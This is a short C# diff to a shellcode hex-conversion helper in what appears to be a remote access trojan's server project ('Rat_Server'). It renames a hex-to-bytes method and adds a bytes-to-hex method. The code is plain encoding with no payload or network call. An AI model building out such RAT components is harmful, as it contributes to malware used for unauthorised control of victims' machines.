@@ -1,10 +1,11 @@
 ﻿using System;
+using System.Text;
 
 namespace Rat_Server.Model.DataConverter;
 
 public class ShellCodeConverter
 {
-    public static byte[] ToByteArray(string shellcode)
+    public static byte[] ToShellCodeByteArray(string shellcode)
     {
         if (shellcode.Length % 2 != 0)
         {
@@ -21,5 +22,15 @@ public class ShellCodeConverter
         }
 
         return byteArray;
+    }
+
+    public static string ToShellCodeString(byte[] byteArray)
+    {
+        StringBuilder shellcodeString = new StringBuilder(byteArray.Length * 2);
+        foreach (byte b in byteArray)
+        {
+            shellcodeString.Append(b.ToString("x2"));
+        }
+        return shellcodeString.ToString();
     }
 }
